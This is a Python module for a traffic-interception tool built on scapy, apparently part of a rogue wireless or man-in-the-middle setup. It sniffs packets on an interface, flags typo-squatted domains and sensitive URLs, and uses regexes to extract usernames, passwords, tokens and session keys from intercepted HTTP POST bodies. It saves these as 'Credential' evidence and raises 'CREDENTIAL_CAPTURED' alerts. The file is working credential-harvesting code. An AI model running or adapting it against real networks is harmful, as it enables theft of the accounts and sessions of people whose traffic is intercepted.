from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw
from scapy.layers.http import HTTPRequest
import re
import datetime
import json
from database import SessionLocal
from models import InterceptedTraffic, DeviceFingerprint, WirelessClient, Evidence

# ─── Configuration ──────────────────────────────────────────────────────────

SENSITIVE_PATTERNS = ["login", "password", "admin", "secret", "config", "vault", "credentials"]
TYPO_DOMAINS = ["google.com", "facebook.com", "bankofamerica.com", "paypal.com", "github.com"]

# ─── Detection Logic ─────────────────────────────────────────────────────────

def is_typo_squatting(domain):
    """
    Simulated Typo-Squatting Detection:
    Checks for close matches or visually similar characters.
    """
    if not domain: return False
    domain = domain.lower()
    
    # Simple check for common swaps (e.g., 'o' -> '0', 'l' -> '1' or 'I')
    for target in TYPO_DOMAINS:
        if domain == target: continue
        # If domain is extremely similar but not identical
        # (Using a very basic distance-like check for this military-grade demo)
        if len(domain) == len(target):
            diff_chars = sum(1 for a, b in zip(domain, target) if a != b)
            if diff_chars == 1: return True
            
        # Check for subdomains that look like the target
        if target in domain and domain != target:
            return True
            
    return False

def contains_monitored_pattern(data):
    """Checks for sensitive keywords in URLs or payloads."""
    if not data: return False
    data = data.lower()
    for pattern in SENSITIVE_PATTERNS:
        if pattern in data:
            return True
    return False

# ─── Packet Handler ──────────────────────────────────────────────────────────

def handle_intercepted_packet(packet, signal_queue=None):
    """Parses hijacked traffic for strategic intelligence."""
    try:
        db = SessionLocal()
        
        # 1. DNS Analysis
        if packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
            client_mac = packet.src if packet.haslayer(IP) else "Unknown"
            client_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"
            
            if client_mac and client_ip and client_ip != "Unknown":
                # LINK LAYER 2 TO LAYER 3
                client = db.query(WirelessClient).filter(WirelessClient.mac_address == client_mac.upper()).first()
                if client and client.ip_address != client_ip:
                    client.ip_address = client_ip
                    db.commit()
            
            if is_typo_squatting(qname):
                print(f"[!] DOMINANCE ALERT: Typo-Squatting detected: {qname} from {client_mac}")
                traffic_log = InterceptedTraffic(
                    client_mac=client_mac,
                    client_ip=client_ip,
                    traffic_type="DNS",
                    host=qname,
                    content="Typo-Squatting Detection",
                    severity="High"
                )
                db.add(traffic_log)
                db.commit()
                if signal_queue:
                    signal_queue.put({"type": "TRAFFIC_ALERT", "data": {"mac": client_mac, "type": "DNS", "host": qname, "reason": "Typo-Squat"}})

        # 2. HTTP Analysis
        if packet.haslayer(HTTPRequest):
            host = packet[HTTPRequest].Host.decode('utf-8', errors='ignore')
            path = packet[HTTPRequest].Path.decode('utf-8', errors='ignore')
            client_mac = packet.src
            client_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"
            
            if client_mac and client_ip and client_ip != "Unknown":
                client = db.query(WirelessClient).filter(WirelessClient.mac_address == client_mac.upper()).first()
                if client and client.ip_address != client_ip:
                    client.ip_address = client_ip
                    db.commit()
            
            is_suspicious = contains_monitored_pattern(path) or is_typo_squatting(host)
            
            # 3. Deep Packet Exfiltration (POST Data)
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode('utf-8', errors='ignore')
                method = packet[HTTPRequest].Method.decode('utf-8', errors='ignore') if hasattr(packet[HTTPRequest], 'Method') else "GET"
                
                # Sniff for credential fields in the payload
                cred_patterns = [
                    r'(?:user|uname|username|email|login|id)=(?P<user>[^&]+)',
                    r'(?:pass|password|pwd|secret)=(?P<pass>[^&]+)',
                    r'(?P<token>token|session|auth|key)=(?P<val>[^&]+)'
                ]
                
                found_creds = {}
                for pattern in cred_patterns:
                    match = re.search(pattern, load, re.IGNORECASE)
                    if match:
                        found_creds.update(match.groupdict())
                
                if found_creds:
                    print(f"[+] STRATEGIC HIT: Captured credentials from {client_mac} -> {host}")
                    evidence = Evidence(
                        target_ip=client_ip,
                        data_type="Credential",
                        content=json.dumps({
                            "host": host,
                            "path": path,
                            "method": method,
                            "captured": found_creds,
                            "raw_payload": load[:200] # Truncate for safety
                        })
                    )
                    db.add(evidence)
                    db.commit()
                    
                    if signal_queue:
                        signal_queue.put({
                            "type": "CREDENTIAL_CAPTURED", 
                            "data": {
                                "mac": client_mac, 
                                "host": host, 
                                "type": "Strategic Asset",
                                "fields": list(found_creds.keys())
                            }
                        })

            if is_suspicious:
                print(f"[!] DOMINANCE ALERT: Suspicious Resource: {host}{path} accessed by {client_mac}")
                traffic_log = InterceptedTraffic(
                    client_mac=client_mac,
                    client_ip=client_ip,
                    traffic_type="HTTP",
                    host=host,
                    content=path,
                    severity="High" if "login" in path or "password" in path else "Medium"
                )
                db.add(traffic_log)
                db.commit()
                if signal_queue:
                    signal_queue.put({"type": "TRAFFIC_ALERT", "data": {"mac": client_mac, "type": "HTTP", "host": host, "path": path, "reason": "Sensitive Pattern"}})

        db.close()
    except Exception as e:
        # Avoid crashing the sniffer on a bad packet
        pass

# ─── External API ──────────────────────────────────────────────────────────

def start_live_interception(interface, signal_queue=None):
    """Starts the comprehensive traffic monitor."""
    print(f"[*] AIRSPACE DOMINANCE: Starting Comprehensive Monitor on {interface}")
    try:
        sniff(iface=interface, prn=lambda p: handle_intercepted_packet(p, signal_queue), store=0)
    except Exception as e:
        print(f"[-] Dominance Engine Failure: {e}")
